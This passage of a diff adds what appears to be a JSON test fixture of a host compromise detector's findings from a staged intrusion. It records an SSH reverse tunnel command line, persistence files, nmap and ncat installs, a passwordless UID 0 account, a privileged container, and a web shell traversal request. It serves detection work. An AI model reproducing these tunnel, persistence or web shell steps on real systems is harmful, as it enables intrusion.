+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-40",
+   "check": "net.metadata",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "A program other than the cloud agent reached the metadata address",
+   "from_host": {
+    "summary": "sleep (pid 16505, root, /usr/bin/sleep): connected to IP-1-0000 port 80, established",
+    "entities": [
+     "address:IP-1-0000",
+     "account:root",
+     "pid:16505",
+     "program:sleep",
+     "exe:/usr/bin/sleep"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16505 ppid=1 comm=sleep exe=/usr/bin/sleep cmdline=sleep 7200 uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:20.700000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:20.700000+00:00",
+    "last_seen": "2026-10-29T15:51:20.700000+00:00"
+   }
+  },
+  {
+   "id": "F-41",
+   "check": "net.tunnel",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "An SSH client forwarding ports (a tunnel)",
+   "from_host": {
+    "summary": "ssh (pid 16531, root): -R 127.0.0.1:2222:127.0.0.1:22; ssh -f -N -o StrictHostKeyChecking=no -o BatchMode=yes -i /root/.ssh/cc_tunnel -R 127.0.0.1:2222:127.0.0.1:22 root@127.0.0.1",
+    "entities": [
+     "pid:16531",
+     "program:ssh",
+     "account:root",
+     "exe:/usr/bin/ssh"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16531 ppid=1 comm=ssh exe=/usr/bin/ssh cmdline=ssh -f -N -o StrictHostKeyChecking=no -o BatchMode=yes -i /root/.ssh/cc_tunnel -R 127.0.0.1:2222:127.0.0.1:22 root@127.0.0.1 uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:21.540000+00:00 cwd=/root"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:21.540000+00:00",
+    "last_seen": "2026-10-29T15:51:21.540000+00:00"
+   }
+  },
+  {
+   "id": "F-44",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "A new cron file",
+   "from_host": {
+    "summary": "/etc/cron.d/cc-proof",
+    "entities": [
+     "path:/etc/cron.d/cc-proof"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "cron, since the baseline",
+      "text": "added: /etc/cron.d/cc-proof: content_sha256=c8956c0d614ee8ac414864866c64b208a55d397523449b744271d5c722dc3a37 ctime=2026-10-29T15:51:18.139286+00:00 gid=0 inode=151158 mode=0644 mtime=2026-10-29T15:51:18.139286+00:00 nlink=1 record=file sha256=c8956c0d614ee8ac414864866c64b208a55d397523449b744271d5c722dc3a37 size=40 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-50",
+   "check": "software.repository",
+   "variant": "key",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "A package signing key was added",
+   "from_host": {
+    "summary": "/etc/pki/rpm-gpg/RPM-GPG-KEY-cc-proof",
+    "entities": [
+     "path:/etc/pki/rpm-gpg/RPM-GPG-KEY-cc-proof"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "software_files, since the baseline",
+      "text": "added: /etc/pki/rpm-gpg/RPM-GPG-KEY-cc-proof: ctime=2026-10-29T15:51:30.349142+00:00 gid=0 inode=151393 mode=0644 mtime=2026-10-29T15:51:30.349142+00:00 record=signing_key sha256=e4ba609b7ee1aed474c0c861438daa490c64ce07a71f80265dc9a56a6b6104df size=512 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-52",
+   "check": "software.tools",
+   "variant": "attack_tool",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "An attack or tunnelling tool was installed",
+   "from_host": {
+    "summary": "nmap 3:7.92-5.el9",
+    "entities": [
+     "package:nmap"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "packages, since the baseline",
+      "text": "added: nmap x86_64: installed=1793289089 manager=rpm version=3:7.92-5.el9"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:29+00:00",
+    "last_seen": "2026-10-29T15:51:29+00:00"
+   }
+  },
+  {
+   "id": "F-54",
+   "check": "ssh.login",
+   "variant": "new_address",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "Logins from an address never seen before",
+   "from_host": {
+    "summary": "127.0.0.1: 1 login(s) as root",
+    "entities": [
+     "address:127.0.0.1",
+     "account:root"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:21",
+      "where": "auth_journal",
+      "text": "Accepted publickey for root from 127.0.0.1 port 51716 ssh2: ED25519 KEY-3-0000"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:21.619723+00:00",
+    "last_seen": "2026-10-29T15:51:21.619723+00:00"
+   }
+  },
+  {
+   "id": "F-57",
+   "check": "web.exploit",
+   "variant": "answered",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 1.3863,
+   "suppressed_by": null,
+   "title": "A traversal attack answered",
+   "from_host": {
+    "summary": "127.0.0.0/24: 1 request (status 200), e.g. /cc-shell.php?c=[MASKED:value]&f=[MASKED:exploit:traversal]",
+    "entities": [
+     "address:127.0.0.0/24"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:23",
+      "where": "web_logs:/var/log/nginx/access.log",
+      "text": "127.0.0.1 - - [29/Oct/2026:15:51:23 +0000] \"GET /cc-shell.php?c=[MASKED:value]&f=[MASKED:exploit:traversal] HTTP/1.1\" 200 96 \"-\" \"curl/7.76.1\" \"-\""
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:23.041747+00:00",
+    "last_seen": "2026-10-29T15:51:23.041747+00:00"
+   }
+  },
+  {
+   "id": "F-42",
+   "check": "net.tunnel",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "An SSH session listening on a port (a remote forward)",
+   "from_host": {
+    "summary": "sshd session (pid 16534) listening on 127.0.0.1 port 2222",
+    "entities": [
+     "pid:16534",
+     "program:sshd"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "running process",
+      "text": "pid=16534 ppid=16526 comm=sshd-session exe=/usr/libexec/openssh/sshd-session cmdline=sshd-session: root uids=[0, 0, 0, 0] start_time=2026-10-29T15:51:21.580000+00:00 cwd=/"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:21.580000+00:00",
+    "last_seen": "2026-10-29T15:51:21.580000+00:00"
+   }
+  },
+  {
+   "id": "F-51",
+   "check": "software.repository",
+   "variant": "repository",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "A package repository was added",
+   "from_host": {
+    "summary": "/etc/yum.repos.d/cc-proof.repo",
+    "entities": [
+     "path:/etc/yum.repos.d/cc-proof.repo"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "software_files, since the baseline",
+      "text": "added: /etc/yum.repos.d/cc-proof.repo: content_sha256=9198fac740912b123fdb4194087f7ce22f932a9049f21666ce0ca65e1e8e011c ctime=2026-10-29T15:51:30.349142+00:00 gid=0 inode=151394 mode=0644 mtime=2026-10-29T15:51:30.349142+00:00 nlink=1 record=file sha256=9198fac740912b123fdb4194087f7ce22f932a9049f21666ce0ca65e1e8e011c size=120 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-53",
+   "check": "software.tools",
+   "variant": "attack_tool",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.6931,
+   "suppressed_by": null,
+   "title": "An attack or tunnelling tool was installed",
+   "from_host": {
+    "summary": "nmap-ncat 3:7.92-5.el9",
+    "entities": [
+     "package:nmap-ncat"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "packages, since the baseline",
+      "text": "added: nmap-ncat x86_64: installed=1793289089 manager=rpm version=3:7.92-5.el9"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:29+00:00",
+    "last_seen": "2026-10-29T15:51:29+00:00"
+   }
+  },
+  {
+   "id": "F-31",
+   "check": "account.changes",
+   "variant": "new",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new account",
+   "from_host": {
+    "summary": "USER-1-0000 (UID 0, shell /bin/bash)",
+    "entities": [
+     "account:USER-1-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "accounts, since the baseline",
+      "text": "added: USER-1-0000: gid=0 home=/home/USER-1-0000 password={'status': 'shadowed'} shadow_last_change=2026-10-29 shadow_last_change_days=20755 shadow_max_days=99999 shadow_min_days=0 shadow_status=no_password shadow_warn_days=7 shell=/bin/bash uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-32",
+   "check": "account.changes",
+   "variant": "new",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new account",
+   "from_host": {
+    "summary": "USER-2-0000 (UID 1002, shell /bin/bash)",
+    "entities": [
+     "account:USER-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "accounts, since the baseline",
+      "text": "added: USER-2-0000: gid=1002 home=/home/USER-2-0000 password={'status': 'shadowed'} shadow_last_change=2026-10-29 shadow_last_change_days=20755 shadow_max_days=99999 shadow_min_days=0 shadow_status=no_password shadow_warn_days=7 shell=/bin/bash uid=1002"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-33",
+   "check": "account.changes",
+   "variant": "new",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new account",
+   "from_host": {
+    "summary": "www-data (UID 994, shell /usr/sbin/nologin)",
+    "entities": [
+     "account:www-data"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "accounts, since the baseline",
+      "text": "added: www-data: gid=994 home=/home/www-data password={'status': 'shadowed'} shadow_last_change=2026-10-29 shadow_last_change_days=20755 shadow_status=no_password shell=/usr/sbin/nologin uid=994"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-35",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1766,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: USER-2-0000 UID 1002",
+    "entities": [
+     "account:USER-2-0000"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:52:06",
+      "where": "auth_journal",
+      "text": "new user: name=USER-2-0000, UID=1002, GID=1002, home=/home/USER-2-0000, shell=/bin/bash, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:52:06.507971+00:00",
+    "last_seen": "2026-10-29T15:52:06.507971+00:00"
+   }
+  },
+  {
+   "id": "F-45",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1386,
+   "suppressed_by": null,
+   "title": "A new systemd file",
+   "from_host": {
+    "summary": "/etc/systemd/system/cc-proof.service",
+    "entities": [
+     "path:/etc/systemd/system/cc-proof.service"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "systemd, since the baseline",
+      "text": "added: /etc/systemd/system/cc-proof.service: content_sha256=37b323f73326896159d5b81ac06e6e53660073a9d5cff42707a5e9d7e09d0eff ctime=2026-10-29T15:51:18.139286+00:00 gid=0 inode=151181 mode=0644 mtime=2026-10-29T15:51:18.139286+00:00 nlink=1 record=file sha256=37b323f73326896159d5b81ac06e6e53660073a9d5cff42707a5e9d7e09d0eff size=62 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-46",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1386,
+   "suppressed_by": null,
+   "title": "A new systemd file",
+   "from_host": {
+    "summary": "/etc/systemd/system/cc-proof.timer",
+    "entities": [
+     "path:/etc/systemd/system/cc-proof.timer"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "systemd, since the baseline",
+      "text": "added: /etc/systemd/system/cc-proof.timer: content_sha256=f2aa6edd5f7d59624169dbd750824e59d6c18281973594eca45512c4a0995fd0 ctime=2026-10-29T15:51:18.139286+00:00 gid=0 inode=151318 mode=0644 mtime=2026-10-29T15:51:18.139286+00:00 nlink=1 record=file sha256=f2aa6edd5f7d59624169dbd750824e59d6c18281973594eca45512c4a0995fd0 size=59 type=- uid=0"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-47",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1386,
+   "suppressed_by": null,
+   "title": "A new startup file",
+   "from_host": {
+    "summary": "/home/USER-2-0000/.bash_logout",
+    "entities": [
+     "path:/home/USER-2-0000/.bash_logout"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "startup, since the baseline",
+      "text": "added: /home/USER-2-0000/.bash_logout: accounts=['USER-2-0000'] ctime=2026-10-29T15:52:06.515921+00:00 gid=1002 home=/home/USER-2-0000 inode=265987 mode=0644 mtime=2024-04-30T11:28:08+00:00 record=home_startup_file sha256=2584c4ba8b0d2a52d94023f420b7e356a1b1a3f2291ad5eba06683d58c48570d size=18 type=- uid=1002"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-48",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1386,
+   "suppressed_by": null,
+   "title": "A new startup file",
+   "from_host": {
+    "summary": "/home/USER-2-0000/.bash_profile",
+    "entities": [
+     "path:/home/USER-2-0000/.bash_profile"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "startup, since the baseline",
+      "text": "added: /home/USER-2-0000/.bash_profile: accounts=['USER-2-0000'] ctime=2026-10-29T15:52:06.514921+00:00 gid=1002 home=/home/USER-2-0000 inode=265985 mode=0644 mtime=2024-04-30T11:28:08+00:00 record=home_startup_file sha256=28bc81aadfd6e6639675760dc11dddd4ed1fcbd08f423224a93c09802552b87e size=141 type=- uid=1002"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-49",
+   "check": "persistence.changes",
+   "variant": null,
+   "band": "medium",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.1386,
+   "suppressed_by": null,
+   "title": "A new startup file",
+   "from_host": {
+    "summary": "/home/USER-2-0000/.bashrc",
+    "entities": [
+     "path:/home/USER-2-0000/.bashrc"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "startup, since the baseline",
+      "text": "added: /home/USER-2-0000/.bashrc: accounts=['USER-2-0000'] ctime=2026-10-29T15:52:06.515921+00:00 gid=1002 home=/home/USER-2-0000 inode=265988 mode=0644 mtime=2024-04-30T11:28:08+00:00 record=home_startup_file sha256=b152cd21940a5775052414906ab7473a62b69da2300bbf541ce8e10f00c487d5 size=492 type=- uid=1002"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-68",
+   "check": "container.new",
+   "variant": "new",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.4055,
+   "suppressed_by": null,
+   "title": "A container new since the baseline",
+   "from_host": {
+    "summary": "podman: cc-priv: image docker.io/library/alpine:latest (running)",
+    "entities": [
+     "container:podman: cc-priv",
+     "image:docker.io/library/alpine"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "containers, since the baseline",
+      "text": "added: podman: cc-priv: capabilities=['AUDIT_CONTROL', 'AUDIT_READ', 'AUDIT_WRITE', 'BLOCK_SUSPEND', 'BPF', 'CHECKPOINT_RESTORE', 'CHOWN', 'DAC_OVERRIDE', 'DAC_READ_SEARCH', 'FOWNER', 'FSETID', 'IPC_LOCK', 'IPC_OWNER', 'KILL', 'LEASE', 'LINUX_IMMUTABLE', 'MAC_ADMIN', 'MAC_OVERRIDE', 'MKNOD', 'NET_ADMIN', 'NET_BIND_SERVICE'…"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-69",
+   "check": "net.listener",
+   "variant": null,
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.4055,
+   "suppressed_by": null,
+   "title": "A new listening port",
+   "from_host": {
+    "summary": "tcp 127.0.0.1:2222 netns=net:[4026531840]: sshd-session",
+    "entities": [
+     "program:sshd-session",
+     "address:127.0.0.1",
+     "account:root"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "listeners, since the baseline",
+      "text": "added: tcp 127.0.0.1:2222 netns=net:[4026531840]: programs=['sshd-session'] sockets=1 uids=[0]"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-73",
+   "check": "package.changed",
+   "variant": null,
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.4055,
+   "suppressed_by": null,
+   "title": "The package managers' checksum lists changed since the baseline",
+   "from_host": {
+    "summary": "3 list file(s): expected after package installs and updates; a rewrite to hide a replaced file would show here too",
+    "entities": [],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "checksum_store, since the baseline",
+      "text": "changed: /var/lib/rpm/rpmdb.sqlite: ctime: 2026-10-29T15:50:22.369529+00:00 → 2026-10-29T15:51:30.209144+00:00; mtime: 2026-10-29T15:50:22.369529+00:00 → 2026-10-29T15:51:30.209144+00:00; size: 32440320 → 32714752"
+     },
+     {
+      "where": "checksum_store, since the baseline",
+      "text": "changed: /var/lib/rpm/rpmdb.sqlite-shm: ctime: 2026-10-29T15:50:22.367529+00:00 → 2026-10-29T15:51:30.204144+00:00; mtime: 2026-10-29T15:50:22.367529+00:00 → 2026-10-29T15:51:30.204144+00:00"
+     },
+     {
+      "where": "checksum_store, since the baseline",
+      "text": "changed: /var/lib/rpm/rpmdb.sqlite-wal: ctime: 2026-10-29T15:50:22.374529+00:00 → 2026-10-29T15:51:30.214144+00:00; mtime: 2026-10-29T15:50:22.374529+00:00 → 2026-10-29T15:51:30.214144+00:00"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-75",
+   "check": "software.packages",
+   "variant": "installed",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.4055,
+   "suppressed_by": null,
+   "title": "Packages installed since the baseline",
+   "from_host": {
+    "summary": "4: libibverbs, libpcap, nmap, nmap-ncat",
+    "entities": [
+     "package:libibverbs",
+     "package:libpcap",
+     "package:nmap",
+     "package:nmap-ncat"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "packages, since the baseline",
+      "text": "added: libibverbs x86_64: installed=1793289089 manager=rpm version=61.0-2.el9"
+     },
+     {
+      "where": "packages, since the baseline",
+      "text": "added: libpcap x86_64: installed=1793289089 manager=rpm version=14:1.10.0-4.el9_8.1"
+     },
+     {
+      "where": "packages, since the baseline",
+      "text": "added: nmap x86_64: installed=1793289089 manager=rpm version=3:7.92-5.el9"
+     },
+     {
+      "where": "packages, since the baseline",
+      "text": "added: nmap-ncat x86_64: installed=1793289089 manager=rpm version=3:7.92-5.el9"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:29+00:00",
+    "last_seen": "2026-10-29T15:51:29+00:00"
+   }
+  },
+  {
+   "id": "F-70",
+   "check": "net.listener",
+   "variant": null,
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new listening port",
+   "from_host": {
+    "summary": "tcp 127.0.0.1:4444 netns=net:[4026531840]: python3",
+    "entities": [
+     "program:python3",
+     "address:127.0.0.1",
+     "account:root"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "listeners, since the baseline",
+      "text": "added: tcp 127.0.0.1:4444 netns=net:[4026531840]: programs=['python3'] sockets=1 uids=[0]"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-71",
+   "check": "net.listener",
+   "variant": null,
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new listening port",
+   "from_host": {
+    "summary": "tcp 127.0.0.1:445 netns=net:[4026531840]: python3",
+    "entities": [
+     "program:python3",
+     "address:127.0.0.1",
+     "account:root"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "listeners, since the baseline",
+      "text": "added: tcp 127.0.0.1:445 netns=net:[4026531840]: programs=['python3'] sockets=1 uids=[0]"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-72",
+   "check": "net.listener",
+   "variant": null,
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.231,
+   "suppressed_by": null,
+   "title": "A new listening port",
+   "from_host": {
+    "summary": "udp 0.0.0.0:37756 netns=net:[4026531840]: local",
+    "entities": [
+     "program:local",
+     "address:0.0.0.0",
+     "account:postfix"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "where": "listeners, since the baseline",
+      "text": "added: udp 0.0.0.0:37756 netns=net:[4026531840]: programs=['local'] sockets=1 uids=[89]"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": null,
+    "last_seen": null
+   }
+  },
+  {
+   "id": "F-58",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: apache UID 48",
+    "entities": [
+     "account:apache"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:21",
+      "where": "auth_journal",
+      "text": "new user: name=apache, UID=48, GID=48, home=/usr/share/httpd, shell=/sbin/nologin, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:21.172464+00:00",
+    "last_seen": "2026-10-29T15:50:21.172464+00:00"
+   }
+  },
+  {
+   "id": "F-59",
+   "check": "account.log_changes",
+   "variant": "group_created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: group apache",
+    "entities": [
+     "group:apache"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:21",
+      "where": "auth_journal",
+      "text": "new group: name=apache, GID=48"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:21.143539+00:00",
+    "last_seen": "2026-10-29T15:50:21.143539+00:00"
+   }
+  },
+  {
+   "id": "F-60",
+   "check": "account.log_changes",
+   "variant": "group_created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: group nginx",
+    "entities": [
+     "group:nginx"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:20",
+      "where": "auth_journal",
+      "text": "new group: name=nginx, GID=995"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:20.934007+00:00",
+    "last_seen": "2026-10-29T15:50:20.934007+00:00"
+   }
+  },
+  {
+   "id": "F-61",
+   "check": "account.log_changes",
+   "variant": "group_created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: group postdrop",
+    "entities": [
+     "group:postdrop"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:07",
+      "where": "auth_journal",
+      "text": "new group: name=postdrop, GID=90"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:07.838428+00:00",
+    "last_seen": "2026-10-29T15:50:07.838428+00:00"
+   }
+  },
+  {
+   "id": "F-62",
+   "check": "account.log_changes",
+   "variant": "group_created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: group postfix",
+    "entities": [
+     "group:postfix"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:07",
+      "where": "auth_journal",
+      "text": "new group: name=postfix, GID=89"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:07.665892+00:00",
+    "last_seen": "2026-10-29T15:50:07.665892+00:00"
+   }
+  },
+  {
+   "id": "F-63",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: nginx UID 995",
+    "entities": [
+     "account:nginx"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:20",
+      "where": "auth_journal",
+      "text": "new user: name=nginx, UID=995, GID=995, home=/var/lib/nginx, shell=/sbin/nologin, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:20.960459+00:00",
+    "last_seen": "2026-10-29T15:50:20.960459+00:00"
+   }
+  },
+  {
+   "id": "F-64",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: postfix UID 89",
+    "entities": [
+     "account:postfix"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:07",
+      "where": "auth_journal",
+      "text": "new user: name=postfix, UID=89, GID=89, home=/var/spool/postfix, shell=/sbin/nologin, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:07.725135+00:00",
+    "last_seen": "2026-10-29T15:50:07.725135+00:00"
+   }
+  },
+  {
+   "id": "F-65",
+   "check": "account.log_changes",
+   "variant": "created",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": true,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "created: www-data UID 994",
+    "entities": [
+     "account:www-data"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:51:20",
+      "where": "auth_journal",
+      "text": "new user: name=www-data, UID=994, GID=994, home=/home/www-data, shell=/usr/sbin/nologin, from=none"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:51:20.809118+00:00",
+    "last_seen": "2026-10-29T15:51:20.809118+00:00"
+   }
+  },
+  {
+   "id": "F-66",
+   "check": "account.log_changes",
+   "variant": "group_member_added",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
+    "summary": "member added: postfix group mail",
+    "entities": [
+     "account:postfix",
+     "group:mail"
+    ],
+    "entities_complete": true,
+    "excerpts": [
+     {
+      "when": "2026-10-29T15:50:07",
+      "where": "auth_journal",
+      "text": "add 'postfix' to group 'mail'"
+     }
+    ],
+    "uncertain": null,
+    "first_seen": "2026-10-29T15:50:07.908176+00:00",
+    "last_seen": "2026-10-29T15:50:07.908176+00:00"
+   }
+  },
+  {
+   "id": "F-67",
+   "check": "account.log_changes",
+   "variant": "group_member_added",
+   "band": "low",
+   "category": "compromise indicator",
+   "new": false,
+   "contribution": 0.0517,
+   "suppressed_by": null,
+   "title": "An account or group was changed (from the logs)",
+   "from_host": {
